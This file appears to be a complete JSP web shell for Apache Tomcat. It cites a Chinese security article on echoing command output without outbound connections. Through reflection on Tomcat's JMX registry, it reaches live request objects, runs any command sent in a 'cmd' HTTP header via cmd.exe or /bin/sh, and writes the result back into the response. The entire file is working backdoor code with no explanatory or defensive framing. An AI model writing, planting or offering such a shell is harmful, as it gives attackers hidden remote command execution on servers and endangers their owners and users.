<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%

//        参考：
//        《tomcat不出网回显连续剧第六集》    https://xz.aliyun.com/t/7535

    boolean flag = false;

    javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
    java.lang.reflect.Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
    field.setAccessible(true);
    Object obj = field.get(mbeanServer);

    field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
    field.setAccessible(true);
    com.sun.jmx.mbeanserver.Repository repository  = (com.sun.jmx.mbeanserver.Repository) field.get(obj);

    java.util.Set<com.sun.jmx.mbeanserver.NamedObject> objectSet =  repository.query(new javax.management.ObjectName("Catalina:type=GlobalRequestProcessor,*"), null);
    for(com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet){
        javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
        field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
        field.setAccessible(true);
        obj = field.get(dynamicMBean);

        field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
        field.setAccessible(true);
        java.util.ArrayList procssors = (java.util.ArrayList) field.get(obj);

        field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
        field.setAccessible(true);
        for(int i = 0; i < procssors.size(); i++){
            org.apache.coyote.Request req = (org.apache.coyote.Request) field.get(procssors.get(i));
            String cmd = req.getHeader("cmd");
            if(cmd != null && !cmd.isEmpty()){
                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();

                Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
                try {
                    Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                    obj = cls.newInstance();
                    cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
                    resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                } catch (NoSuchMethodException var5) {
                    Class cls = Class.forName("java.nio.ByteBuffer");
                    obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                    resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
                }

                flag = true;
            }

            if(flag) break;
        }
    }
%>
